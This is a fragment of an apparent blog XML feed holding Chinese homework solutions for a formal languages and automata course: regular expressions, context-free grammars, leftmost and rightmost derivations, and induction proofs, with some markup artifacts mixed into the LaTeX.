class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码开辟了定长的数组用于存储相关数据, 算法的空间复杂度约为: $8B\times 2\times 10^6 + 4B \times 5\times 10^6 = 36000KB$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业2</title>
      <link href="/16/"/>
      <url>/16/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-3-1-1-b"><a href="#Ex-3-1-1-b" class="headerlink" title="Ex 3.1.1 (b)"></a>Ex 3.1.1 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(0 + 1)^*1(0 + 1)^9.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-1-c"><a href="#Ex-3-1-1-c" class="headerlink" title="Ex 3.1.1 (c)"></a>Ex 3.1.1 (c)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(\varepsilon + 1)(00^<em>1)^</em>(\varepsilon + 1)(00^<em>1)^</em>0^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-2-b"><a href="#Ex-3-1-2-b" class="headerlink" title="Ex 3.1.2 (b)"></a>Ex 3.1.2 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(1^<em>01^</em>01^<em>01^</em>01^<em>0)^</em> + 1^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-3-a"><a href="#Ex-3-1-3-a" class="headerlink" title="Ex 3.1.3 (a)"></a>Ex 3.1.3 (a)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{0^*(1^<em>000^</em>)^<em>1^</em>0^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-3-b"><a href="#Ex-3-1-3-b" class="headerlink" title="Ex 3.1.3 (b)"></a>Ex 3.1.3 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(10 + 01)^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-5"><a href="#Ex-3-1-5" class="headerlink" title="Ex 3.1.5"></a>Ex 3.1.5</h3><p>​    闭包有穷的两个语言分别为:</p><p>​    $$\varnothing, \thinspace\left{\varepsilon\right}.$$</p><p>​    且</p><p>​    $$\varnothing^* = \left{\varepsilon\right}^* = \left{\varepsilon\right}.$$</p><h3 id="Ex-3-4-1-c"><a href="#Ex-3-4-1-c" class="headerlink" title="Ex 3.4.1 (c)"></a>Ex 3.4.1 (c)</h3><p>​    将两个表达式具体化: </p><p>​    将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$, 将 $T$ 替换为 $c$.</p><p>​    从而 $(RS)T$ 具体化为 $(ab)c$, $R(ST)$具体化为 $a(bc)$.</p><p>​    而 </p><p>​    $$L((ab)c) = \left{abc\right} = L(a(bc)),$$</p><p>​    故原式成立.</p><h3 id="Ex-3-4-1-g"><a href="#Ex-3-4-1-g" class="headerlink" title="Ex 3.4.1 (g)"></a>Ex 3.4.1 (g)</h3><p>​    将两个表达式具体化: 将 $R$ 替换为 $a$, </p><p>​    从而 $(\varepsilon + R)^*$ 具体化为 $(\varepsilon + a)^*$, $R^*$具体化为 $a^*$.</p><p>​    注意到</p><p>​    $$\left{\varepsilon, a\right}^* = \left{\varepsilon, a, a^2, a^3, \cdots\right} = \left{a\right}^*,$$</p><p>​    由此得</p><p>​    $$L((\varepsilon + a)^*) = L(a^*).$$</p><p>​    故原式成立.</p><h3 id="Ex-3-4-2-b"><a href="#Ex-3-4-2-b" class="headerlink" title="Ex 3.4.2 (b)"></a>Ex 3.4.2 (b)</h3><p>​    将两个表达式具体化: </p><p>​    将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$,</p><p>​    从而 $(RS + R)^<em>R$ 具体化为 $(ab + a)^</em>a$, </p><p>​    而$R(SR + R)^*$ 具体化为 $a(ba + a)^*$.</p><p>​    下证</p><p>​    $$L((ab + a)^<em>a) = L(a(ba + a)^</em>).$$</p><p>​    归纳易得 $\forall\thinspace k\in\mathbb{N}$, 有</p><p>​    $$\left{ab, a\right}^k\left{a\right} = \left{a\right}\left{ba, a\right}^k$$</p><p>​    进而由连接运算的分配律可知 </p><p>​    $$L((ab+a)^*a) = \mathop{\bigcup}_{k\in\mathbb{N}}\left{ab, a\right}^k\left{a\right},$$</p><p>​    $$L(a(ba+a)^*) = \mathop{\bigcup}_{k\in\mathbb{N}}\left{a\right}\left{ab, a\right}^k.$$</p><p>​    由此得</p><p>​    $$L((ab + a)^<em>a) = L(a(ba + a)^</em>).$$</p><p>​    故原式成立.</p><h3 id="Ex-3-4-2-d"><a href="#Ex-3-4-2-d" class="headerlink" title="Ex 3.4.2 (d)"></a>Ex 3.4.2 (d)</h3><p>​    将两个表达式具体化: 将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$,</p><p>​    从而 $(R + S)^<em>S$ 具体化为 $(a + b)^</em>b$, $(R^<em>S)^</em>$化为 $(a^<em>b)^</em>$.</p><p>​    注意到</p><p>​    $$\varepsilon\in L((a^<em>b)^</em>), \thinspace\varepsilon\notin L((a + b)^*b)$$</p><p>​    从而</p><p>​    $$L((a + b)^<em>b) \ne L((a^</em>b)^*).$$</p><p>​    故原式不成立.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业1</title>
      <link href="/15/"/>
      <url>/15/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-5-1-1-b"><a href="#Ex-5-1-1-b" class="headerlink" title="Ex 5.1.1 (b)"></a>Ex 5.1.1 (b)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow AB \mid CD \</p><p>​            A &amp;\rightarrow aA \mid \varepsilon \</p><p>​            B &amp;\rightarrow bBc \mid bE \mid cD \</p><p>​            C &amp;\rightarrow aCb \mid bE \mid aA \</p><p>​            D &amp;\rightarrow cD \mid \varepsilon \</p><p>​            E &amp;\rightarrow bE \mid \varepsilon</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-5-1-2-c"><a href="#Ex-5-1-2-c" class="headerlink" title="Ex 5.1.2 (c)"></a>Ex 5.1.2 (c)</h3><p>​    一个最左推导:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\mathop{\Longrightarrow}<em>{lm} A1B \mathop{\Longrightarrow}</em>{lm} 0A1B \mathop{\Longrightarrow}_{lm} 00A1B \</p><p>​              &amp;\mathop{\Longrightarrow}<em>{lm} 000A1B \mathop{\Longrightarrow}</em>{lm} 0001B \mathop{\Longrightarrow}_{lm} 00011B \</p><p>​              &amp;\mathop{\Longrightarrow}_{lm} 00011;</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    一个最右推导:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\mathop{\Longrightarrow}<em>{rm} A1B \mathop{\Longrightarrow}</em>{rm} A11B \mathop{\Longrightarrow}_{rm} A11 \</p><p>​              &amp;\mathop{\Longrightarrow}<em>{rm} 0A11 \mathop{\Longrightarrow}</em>{rm} 00A11 \mathop{\Longrightarrow}_{rm} 000A11 \</p><p>​              &amp;\mathop{\Longrightarrow}_{rm} 00011.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-5-1-6-b"><a href="#Ex-5-1-6-b" class="headerlink" title="Ex 5.1.6 (b)"></a>Ex 5.1.6 (b)</h3><p>​    对推导 $\beta\mathop{\Longrightarrow}^{*}\limits\gamma$ 中的步数进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果该推导是一步完成的, 即$\thinspace\beta\Longrightarrow\gamma$, 那么由</p><p>​    $$\alpha\mathop{\Longrightarrow}^{*}\limits\beta, \thinspace\beta\Longrightarrow\gamma,$$</p><p>​    可得</p><p>​    $$\alpha\mathop{\Longrightarrow}^{*}\limits\gamma,$$</p><p>​    因而基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定该推导共包含 $n + 1$ 步, 其中 $n\ge 1$, 并且对于任何 $n$ 步完成的推导上述命题都为真; 也就是说, 如果 $\beta\mathop{\Longrightarrow}^{<em>}\limits\gamma$ 可在 $n$ 步内完成, 那么有 $\alpha\mathop{\Longrightarrow}^{</em>}\limits\gamma$ 成立.</p><p>​    考虑一个 $\beta\mathop{\Longrightarrow}^{*}\limits\gamma$ 的$n + 1$步推导, 它一定是如下形式:</p><p>​    $$\beta\mathop{\Longrightarrow}^{*}\limits\omega\Longrightarrow\gamma,$$</p><p>​    其中 $\beta\mathop{\Longrightarrow}^{*}\limits\omega$ 是一个 $n$ 步推导.</p><p>​    那么根据归纳假设可知, 有 $\alpha\mathop{\Longrightarrow}^{*}\limits\omega$ 成立,</p><p>​    </p><p>​    进而由 $\omega\Longrightarrow\gamma$ 可得</p><p>​    $$\alpha\mathop{\Longrightarrow}^{*}\limits\gamma.$$</p><h3 id="Ex-5-1-8"><a href="#Ex-5-1-8" class="headerlink" title="Ex 5.1.8"></a>Ex 5.1.8</h3><p>​    分为两步来证明.</p><p>​    $\centerdot$ 先证明若串 $\omega$ 中包含相同个数的 $a$ 和 $b$, 则 $\omega\in L(G)$.</p><p>​    易知此时 $\vert\omega\vert$ 为偶数, 对 $\vert\omega\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert\omega\vert = 0$ 或者 $\vert\omega\vert = 2$, 即 $\omega$ 是 $\varepsilon, ab, ba$, 那么由产生式</p><p>​    $$S \rightarrow aSbS \mid bSaS \mid \varepsilon,$$</p><p>​    可得</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits\varepsilon, ab, ba,$$</p><p>​    即</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits\omega, \thinspace\omega\in L(G).$$</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定 $\vert\omega\vert = 2n$, 其中 $n\ge 2$, 并且对任何 $\vert\omega_0\vert \le 2n - 2$上述命题都为真; 也就是说, 如果 $\vert\omega_0\vert \le 2n - 2$, 那么有 $\omega_0\in L(G)$成立.</p><p>​    由于 $\omega$ 包含的 $a, b$ 的数量相等, 不妨设 $\omega$ 以 $a$ 开头, 并取其中所包含的一个 $b$, 使得</p><p>​    $$\omega = aubv,$$</p><p>​    其中 $u, v\in \left{a, b\right}^{*}$, 当然有 $\vert u\vert, \vert v\vert \le 2n - 2$.</p><p>​    那么由归纳假设, 有</p><p>​    $$u, v\in L(G),$$</p><p>​    即</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits u, v.$$</p><p>​    那么容易得到</p><p>​    $$S\Longrightarrow aSbS \mathop{\Longrightarrow}^{<em>}\limits aubS \mathop{\Longrightarrow}^{</em>}\limits aubv = \omega,$$</p><p>​    进而</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits \omega, \thinspace\omega\in L(G).$$</p><p>​    至此归纳得证.</p><p>​    $\centerdot$ 再证明若 $\omega\in L(G)$, 即 $S\mathop{\Longrightarrow}^{*}\limits\omega$, 则$\omega$中包含相同个数的 $a$ 和 $b$.</p><p>​    对推导 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 中的步数进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果该推导是$1$步完成的, 那么由 $S\Longrightarrow\varepsilon$</p><p>​    可得</p><p>​    $$\omega = \varepsilon,$$</p><p>​    其包含的 $a, b$ 个数均为 $0$. 至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定该推导共包含 $n + 1$ 步, 其中 $n\ge 3$, 并且对于任何 $n$ 步以内完成的推导上述命题都为真; 也就是说, 如果 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 可在 $n$ 步内完成, 那么有$\omega$中包含相同个数的 $a$ 和 $b$.</p><p>​    考虑一个 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 的 $n + 1$ 步推导, 它一定是如下形式:</p><p>​    $$S\Longrightarrow aSbS\mathop{\Longrightarrow}^{*}\limits\omega,$$</p><p>​    或</p><p>​    $$S\Longrightarrow bSaS\mathop{\Longrightarrow}^{*}\limits\omega,$$</p><p>​    其中 $aSbS\mathop{\Longrightarrow}^{<em>}\limits\omega$, $bSaS\mathop{\Longrightarrow}^{</em>}\limits\omega$ 均是一个 $n$ 步推导.</p><p>​    由 $a, b$ 地位的对称性, 只需考虑第一种情况, 由 $aSbS\mathop{\Longrightarrow}^{*}\limits\omega$ 可得</p><p>​    $$\omega = aubv,$$</p><p>​    其中 $u, v\in \left{a, b\right}^{*}$, </p><p>​    那么容易知道推导 $S\mathop{\Longrightarrow}^{<em>}\limits u$, $S\mathop{\Longrightarrow}^{</em>}\limits v$ 的步数都在 $n$ 步以内.</p><p>​    根据归纳假设可知, $u, v $中包含相同个数的 $a$ 和 $b$.</p><p>​    进而可得 $\omega = aubv$ 中包含相同个数的 $a$ 和 $b$.</p><p>​    至此归纳得证.</p><h3 id="Ex-5-2-2"><a href="#Ex-5-2-2" class="headerlink" title="Ex 5.2.2"></a>Ex 5.2.2</h3><p>​    对推导 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 中的步数 $m$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $m = 1$, 那么有产生式 $S\rightarrow\omega$, 其中 $\omega\ne\varepsilon$.</p><p>​    从而有以下 $n + 1$ 个节点的分析树:</p><p>​<img src="/pic/06.png"></p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定 $m\ge 2$, 且对 $m - 1$ 步以内完成的推导上述命题为真.</p><p>​    设第一步使用了产生式 $S\rightarrow X_1X_2\cdots X_k$, </p><p>​    </p><p>​    那么全部推导形如 $S\rightarrow X_1X_2\cdots X_k\mathop{\Longrightarrow}^{*}\limits\omega$.</p><p>​    可以将 $\omega$ 断开成 $\omega = \omega_1\omega_2\cdots\omega_k$, 其中</p><p>​    $(1)$ 若 $\omega_i$ 为终结符, 则 $\omega_i = X_i$, 可以认为$m_i = 0$;</p><p>​    $(2)$ 若 $\omega_i$ 为非终结符, 则 $X_i\mathop{\Longrightarrow}^{*}\limits\omega_i$, 且推导步数 $m_i &lt; m$. 由归纳假设, 存在根节点为 $X_i$ 的子分析树, 其节点数为 $\vert\omega_i\vert + m_i$.</p><p>​    因此我们得到如下关系:</p><p>​    $$m = m_1 + m_2 + \cdots + m_k + 1.$$</p><p>​    从而有一棵结果为 $\omega$ 的分析树:</p><p> <img src="/pic/07.png"></p><p>​    其节点数为:</p><p>​    $$1 + \sum_{i = 1}^{k}\limits\left(\vert\omega_i\vert + m_i\right) = \sum_{i = 1}^{k}\vert\omega_i\vert + \left(\sum_{i = 1}^{k}m_i + 1\right) = n + m.$$</p><p>​    至此归纳得证.</p><h3 id="Ex-5-4-7-a"><a href="#Ex-5-4-7-a" class="headerlink" title="Ex 5.4.7 (a)"></a>Ex 5.4.7 (a)</h3><p>   一个最左推导:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            E &amp;\mathop{\Longrightarrow}<em>{lm} {+}EE \mathop{\Longrightarrow}</em>{lm} {+}{<em>}EEE \mathop{\Longrightarrow}_{lm} {+}{</em>}{-}EEEE \</p><p>​              &amp;\mathop{\Longrightarrow}<em>{lm} {+}{*}{-}xEEE \mathop{\Longrightarrow}</em>{lm} {+}{<em>}{-}xyEE \mathop{\Longrightarrow}_{lm} {+}{</em>}{-}xyxE \</p><p>​              &amp;\mathop{\Longrightarrow}_{lm} {+}{*}{-}xyxy;</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    一个最右推导:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            E &amp;\mathop{\Longrightarrow}<em>{rm} {+}EE \mathop{\Longrightarrow}</em>{rm} {+}Ey \mathop{\Longrightarrow}_{rm} {+}{*}EEy \</p><p>​              &amp;\mathop{\Longrightarrow}<em>{rm} {+}{*}Exy \mathop{\Longrightarrow}</em>{rm} {+}{<em>}{-}EExy \mathop{\Longrightarrow}_{rm} {+}{</em>}{-}Eyxy \</p><p>​              &amp;\mathop{\Longrightarrow}_{rm} {+}{*}{-}xyxy;</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    一棵语法分析树为:</p><p>  <img src="/pic/08.png"></p><h3 id="Ex-1-1"><a href="#Ex-1-1" class="headerlink" title="*Ex 1 (1)"></a>*Ex 1 (1)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow AB \</p><p>​            A &amp;\rightarrow aAbb \mid \varepsilon \</p><p>​            B &amp;\rightarrow Bc \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-1-2"><a href="#Ex-1-2" class="headerlink" title="*Ex 1 (2)"></a>*Ex 1 (2)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow AB \</p><p>​            A &amp;\rightarrow aAb \mid \varepsilon \</p><p>​            B &amp;\rightarrow bBc \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-1-3"><a href="#Ex-1-3" class="headerlink" title="*Ex 1 (3)"></a>*Ex 1 (3)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow aSd \mid A \mid B \</p><p>​            A &amp;\rightarrow aAc \mid C \</p><p>​            B &amp;\rightarrow bBd \mid C \</p><p>​            C &amp;\rightarrow bCc \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-1-4"><a href="#Ex-1-4" class="headerlink" title="*Ex 1 (4)"></a>*Ex 1 (4)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow AB \mid CD \</p><p>​            A &amp;\rightarrow aAb \mid \varepsilon \</p><p>​            B &amp;\rightarrow bBd \mid D \</p><p>​            C &amp;\rightarrow aCc \mid A \</p><p>​            D &amp;\rightarrow cDd \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-1-5"><a href="#Ex-1-5" class="headerlink" title="*Ex 1 (5)"></a>*Ex 1 (5)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow Ab \</p><p>​            A &amp;\rightarrow BAC \mid a \</p><p>​            B &amp;\rightarrow a \mid b \</p><p>​            C &amp;\rightarrow a \mid b.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-1-6"><a href="#Ex-1-6" class="headerlink" title="*Ex 1 (6)"></a>*Ex 1 (6)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow D \mid AC \mid ABC \</p><p>​            A &amp;\rightarrow aA \mid \varepsilon \</p><p>​            B &amp;\rightarrow bB \mid bb \</p><p>​            C &amp;\rightarrow cC \mid \varepsilon \</p><p>​            D &amp;\rightarrow aDc \mid b.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>\end{proof}</p><p>\subsection*{*Ex 2}</p><p>\begin{proof}[Solution:]</p><p>​    一个二义文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow aS \mid aaSb \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    一个非二义文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow aS \mid T \</p><p>​            T &amp;\rightarrow aaTb \mid \varepsilon. </p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>\end{proof}</p><p>\subsection*{*Ex 3}</p><p>\begin{proof}[Solution:]</p><p>​    题中文法所定义语言的一个无二义文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow Sad \mid Sbd \mid Scd \mid d.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-4"><a href="#Ex-4" class="headerlink" title="*Ex 4"></a>*Ex 4</h3><p>​    我们证明更强的结论:</p><p>​    若 $S\mathop{\Longrightarrow}^{*}\limits\omega$, 推导步数为 $l + 1$, 其中 $l\ge 0$, 那么</p><p>​    $$\omega = (01)^k \in L = \left{(01)^k\mid k\ge 0\right}.$$</p><p>​    若 $T\mathop{\Longrightarrow}^{*}\limits\phi$, 推导步数为 $l + 1$, 其中 $l\ge 0$, 那么</p><p>​    $$\phi = (10)^k \in M = \left{(10)^k\mid k\ge 0\right}.$$</p><p>​    对推导步数进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $l = 0$, 那么有推导 $S\Longrightarrow\varepsilon = \omega = (01)^0$, </p><p>​    </p><p>​    因此 omega = (01)^0\in L = \left{(01)^k\mid k\ge 0\right}$.</p><p>​    同理有推导 $T\Longrightarrow\varepsilon = \phi = (10)^0$, </p><p>​    </p><p>​    因此 $\phi = (10)^0\in M = \left{(10)^k\mid k\ge 0\right}$.</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定推导步数为 $l + 1$, 且对 $l$ 步完成的推导上述命题为真.</p><p>​    考虑推导</p><p>​    $$S\Longrightarrow 0T1\mathop{\Longrightarrow}^{*}\limits\omega = 0\phi_01,$$</p><p>​    其中 $T\mathop{\Longrightarrow}^{*}\limits\phi_0$ 是一个 $l$ 步的推导.</p><p>​    那么由归纳假设, 得</p><p>​    $$\phi_0 = (10)^{l - 1},$$</p><p>​    此时</p><p>​    $$\omega = 0\phi_01 = 0(10)^{l - 1}1 = (01)^l.$$</p><p>​    </p><p>​    再考虑推导</p><p>​    $$T\Longrightarrow 1S0\mathop{\Longrightarrow}^{*}\limits\phi = 1\omega_00,$$</p><p>​    其中 $S\mathop{\Longrightarrow}^{*}\limits\omega_0$ 是一个$l$步的推导.</p><p>​    那么由归纳假设, 得</p><p>​    $$\omega_0 = (01)^{l - 1},$$</p><p>​    进而</p><p>​    $$\phi = 1\omega_00 = 1(01)^{l - 1}0 = (10)^l.$$</p><p>​    </p><p>​    至此归纳得证.</p><p>​    综上所述, 我们证明了若 $S\mathop{\Longrightarrow}^{*}\limits\omega$, 则有</p><p>​    $$\omega\in L = \left{(01)^k\mid k\ge 0\right}.$$</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="Ex-5-1-1-c"><a href="#Ex-5-1-1-c" class="headerlink" title="Ex 5.1.1 (c)"></a>Ex 5.1.1 (c)</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow O \mid E \</p><p>​            O &amp;\rightarrow COC \mid a \mid b \</p><p>​            E &amp;\rightarrow AB \mid BA \</p><p>​            A &amp;\rightarrow CAC \mid a \</p><p>​            B &amp;\rightarrow CBC \mid b \</p><p>​            C &amp;\rightarrow a \mid b.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-5-1-7-a"><a href="#Ex-5-1-7-a" class="headerlink" title="Ex 5.1.7 (a)}"></a>Ex 5.1.7 (a)}</h3><p>​    对任意 $\omega\in L(G)$, 我们证明 $\omega$ 不含子串 $ba$.</p><p>​    对 $\vert\omega\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert\omega\vert = 1$, 那么 $\omega$ 是 $a$ 或者 $b$, </p><p>​    因此 $\omega$ 当然不含子串 $ba$. 至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定 $\vert\omega\vert = n$, 其中 $n\ge 2$, 并且对任何长度小于 $n$ 的串 $\omega_0\in L(G)$ 上述命题都为真.</p><p>​    </p><p>​    也就是说, 如果 $\vert\omega_0\vert \le n - 1$, 那么 $\omega_0$ 不含子串 $ba$.</p><p>​    考虑推导 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 的第一步.</p><p>​    若该推导形如</p><p>​    $$S\Longrightarrow aS \mathop{\Longrightarrow}^{*}\limits \omega = a\omega_1,$$</p><p>​    可知 $\vert\omega_1\vert = n - 1$. 由归纳假设得 $\omega_1$ 中不含子串 $ba$.</p><p>​    又因为 $\omega = a\omega_1$ 以 $a$ 开头, 所以 $\omega$ 中不含子串 $ba$.</p><p>​    若该推导形如</p><p>​    $$S\Longrightarrow Sb \mathop{\Longrightarrow}^{*}\limits \omega = \omega_2b,$$</p><p>​    可知 $\vert\omega_2\vert = n - 1$. 由归纳假设得 $\omega_2$ 中不含子串 $ba$.</p><p>​    又因为 $\omega = \omega_2b$ 以 $b$ 结尾, 所以 $\omega$ 中不含子串 $ba$.</p><p>​    至此归纳得证.</p><h3 id="Ex-5-4-7-b"><a href="#Ex-5-4-7-b" class="headerlink" title="Ex 5.4.7 (b)"></a>Ex 5.4.7 (b)</h3><p>​    给出:</p><p>​    \textbf{<strong>引理 1:</strong>} 一个前缀表达式的运算符节点数比操作数节点数少 $1$.</p><p>​    \textbf{<strong>引理 2:</strong>} 一个前缀表达式从后往前计数, 操作数严格多于运算符节点数.</p><p>​    下面反证: 假设这个文法是有歧义的, 也即存在一个长 $n$ 的前缀表达式, 有 $2$ 种不同的方法将其解析为一棵语法分析树. </p><p>​    </p><p>​    假设方法 $1$ 中 $[1, m]$ 为第一棵子树, $[m + 1, n]$ 为第二棵子树;</p><p>​    </p><p>​    方法 $2$ 中 $[1, k]$ 为第一棵子树, $[k + 1, n]$ 为第二棵子树, 并且 $k &gt; m$.</p><p>​    </p><p>​    由引理 $1$, 区间 $[m + 1, k]$ 必须包含同样数目的运算符节点与操作数节点, 而这个区间是方法 $2$ 中左子树对应表达式的末尾, 这与引理 $2$ 矛盾.</p><p>​    </p><p>​    所以一个前缀表达式不可能有多于一种解析为语法分析树方法, 即题中所给文法是无歧义的.</p><h3 id="Ex-1"><a href="#Ex-1" class="headerlink" title="*Ex 1"></a>*Ex 1</h3><p>​    分为两步来证明.</p><p>​    $\centerdot$ 先证明若串 $\omega$ 形如 $a^ib^jc^k\thinspace(\mbox{其中}\thinspace i + j \le k)$, 则 $\omega\in L(G)$.</p><p>​    记 $l = k - i - j$, 我们给出一个推导 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 的构造.</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\Longrightarrow aSc \mathop{\Longrightarrow}^{*}\limits a^iSc^i \</p><p>​              &amp;\Longrightarrow a^iAc^i \Longrightarrow a^ibAc^{i + 1} \</p><p>​              &amp;\mathop{\Longrightarrow}^{*}\limits a^ib^jAc^{i + j} \Longrightarrow a^ib^jBc^{i + j} \</p><p>​              &amp;\Longrightarrow a^ib^jBc^{i + j + 1} \mathop{\Longrightarrow}^{*}\limits a^ib^jBc^{i + j + l} \ </p><p>​              &amp;\Longrightarrow a^ib^jc^{i + j + l} = a^ib^jc^k = \omega.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    从而 $\omega\in L(G)$.</p><p>​    $\centerdot$ 再证明若 $\omega\in L(G)$, 即 $S\mathop{\Longrightarrow}^{*}\limits\omega$, 则 $\omega$ 形如 $a^ib^jc^k\thinspace(\mbox{其中}\thinspace i + j \le k)$.</p><p>​    容易得到这个推导的步数至少为 $3$. 对推导 $S\mathop{\Longrightarrow}^{*}\limits\omega$ 中的步数进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果该推导是 $3$ 步完成的, 那么由 $S\Longrightarrow A\Longrightarrow B\Longrightarrow\varepsilon$,</p><p>​    可得</p><p>​    $$\omega = \varepsilon = a^0b^0c^0,$$</p><p>​    满足 $i + j = 0 + 0 \le 0 = k $成立. 至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现在假定该推导共包含 $n + 1$ 步, 其中 $n\ge 3$, 并且对于任何 $n$ 步以内完成的推导上述命题都为真.</p><p>​    容易知道第 $n + 1$ 步推导一定使用了产生式:</p><p>​    $$B\longrightarrow\varepsilon,$$</p><p>​    若第 $n$ 步推导使用了产生式:</p><p>​    $$B\longrightarrow Bc,$$</p><p>​    那么全部推导过程形如</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits uBv \Longrightarrow uBcv \Longrightarrow ucv = \omega.$$</p><p>​    不妨考虑一个 $n$ 步的推导</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits uBv \Longrightarrow uv.$$</p><p>​    